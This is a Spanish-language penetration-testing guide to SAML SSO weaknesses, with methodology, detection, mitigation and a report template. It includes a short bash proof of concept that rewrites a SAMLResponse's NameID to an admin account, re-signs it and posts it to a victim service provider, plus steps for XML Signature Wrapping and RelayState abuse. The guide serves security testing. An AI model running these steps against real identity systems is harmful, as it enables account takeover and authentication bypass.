# SAML: Conceptos y Riesgos

## Resumen

**Qué es:** Security Assertion Markup Language (SAML) es un estándar XML para intercambiar datos de autenticación y autorización entre Identity Provider (IdP) y Service Provider (SP).
**Por qué importa:** Implementaciones incorrectas de SAML provocan account takeover, bypass de autenticación, firmas XML inseguras y redirecciones maliciosas.
**Cuándo aplicarlo:** Importante en pentests de aplicaciones corporativas que usan SSO empresarial con SAML, como Active Directory Federation Services (ADFS) o Azure AD.

## Contexto

**Supuestos:**

- La aplicación usa SAML 2.0 para SSO entre un Identity Provider y un Service Provider.
- Acceso a interceptar y modificar mensajes SAML (`SAMLRequest`, `SAMLResponse`) con Burp Suite u otras herramientas.
- Herramientas: Burp Suite XML Tamper, SAML Raider, SAMLTool, xmlstarlet, opensaml utilities.
- Implementaciones evaluadas: ADFS, Shibboleth, OneLogin SAML Toolkits (Java, Python, PHP).

**Límites:**

- Excluye SAML 1.1 y OAuth/OIDC.
- Enfoque en pruebas black/grey box.

## Metodología

1. Descubrimiento de endpoints SSO y ACS (`SAMLRequest`, `SAMLResponse`).
2. Análisis de metadata XML de IdP y SP.
3. Validación de firma XML en Response y Assertion.
4. Pruebas de manipulación de `RelayState` y `Destination`.
5. Ataques de firma: XML Signature Wrapping, XPath injection.
6. Replay de assertions antes de su expiración.
7. Modificación de atributos (`NameID`, roles, grupos).

**Checklist de verificación:**

- Firmado y validado Response completo (Assertion+Response).
- Validación estricta de `Destination` y `AssertionConsumerServiceURL`.
- Protección contra XML Signature Wrapping.
- Uso de HTTPS y certificados válidos.
- Control de expiración: `NotBefore` y `NotOnOrAfter`.

## Pruebas Manuales

**1. Extracción de metadata**

```bash
curl -o idp-metadata.xml https://idp.victima.com/metadata
xmlstarlet sel -t \
  -m "/EntityDescriptor/IDPSSODescriptor/SingleSignOnService" \
  -v "@Location" -n idp-metadata.xml
```

**2. Modificación de SAMLResponse**

- Interceptar y decodificar Base64.
- Cambiar `<NameID>` a `admin@victima.com`.
- Refirmar XML con clave atacante.
- Reenviar al SP y observar acceso admin.

**3. XML Signature Wrapping**

- Insertar assertion maliciosa antes de la firma legítima.
- Ajustar referencias y nodos de firma.
- Enviar al SP y verificar validación incorrecta.

**4. RelayState Abuse**

- Cambiar `RelayState` a URL atacante.
- SP redirige al atacante tras SSO.

## PoC Automatizada

```bash
# 1. Decodificar SAMLResponse
echo "<SAMLResponse>..." | base64 -d > response.xml

# 2. Modificar NameID
xmlstarlet ed \
  -u "/samlp:Response/saml:Assertion/saml:Subject/saml:NameID" \
  -v "admin@victima.com" response.xml > tampered.xml

# 3. Refirmar con openssl
openssl dgst -sha256 -sign private_key.pem tampered.xml | base64 -A > signature

# 4. Insertar firma y codificar
# (Reemplazar Signature value y References URI)

# 5. Enviar al SP
curl -X POST https://sp.victima.com/ACS \
  -d "SAMLResponse=$(base64 -w0 tampered.xml)&RelayState=abc"
```

## Explotación y Automatización

- **XPath Injection:** Manipular expresión XPath en firmas.
- **Replay Attacks:** Reenviar SAMLResponse antes de expiración.
- **Certificate Confusion:** Metadata maliciosa con certificado atacante.

## Impacto

- **Account Takeover:** Acceso total como cualquier usuario, incluidos admin.
- **Bypass MFA:** Si IdP no verifica contexto de autenticación.
- **SSO Phishing:** Usando RelayState para redirecciones maliciosas.

**Mapeo OWASP/CWE:** A2:2021 Broken Authentication; CWE-345; CWE-352.

## Detección

- Logs de discrepancias en `Issuer`, `Destination`, `ACS URL`.
- Alertas de firma inválida o múltiples assertion dentro de un mismo Response.
- Monitoreo de `RelayState` apuntando a dominios externos.

## Mitigación

- Firmar y verificar todo el mensaje SAML (Response+Assertion).
- Usar referencias de firma basadas en ID y XPath.
- Validar `Destination` y `AssertionConsumerServiceURL` contra metadata.
- Implementar nonce y control de expiración (`NotBefore`, `NotOnOrAfter`).
- Deshabilitar metadata dinámica o validar manualmente antes de importar.

## Errores Comunes

- Firmar solo Assertion, no Response.
- No validar atributos de tiempo (`NotOnOrAfter`).
- Confundir URIs en metadata versus mensajes.
- Omitir verificación de firmas en nodos secundarios.

## Reporte

**Título:** XML Signature Wrapping permite account takeover en SAML SSO
**Impacto:** Bypass de autenticación y account takeover sin credenciales.
**Pasos:**

1. Capturar SAMLResponse legítima.
2. Insertar assertion maliciosa y ajustar firma.
3. Reenviar al SP.
4. Verificar acceso admin sin MFA.

**Evidencias:** Petición POST con SAMLResponse modificada y respuesta 200 OK.
**Mitigación:** Firma completa, validación estricta de metadata y endpoints.


[^1]: https://ppl-ai-code-interpreter-files.s3.amazonaws.com/web/direct-files/0bb7cf84c92d1211e156a46c3c8c414a/fb2ce8ae-fb2c-49af-a6e1-33ab97d1c728/e2728eac.md
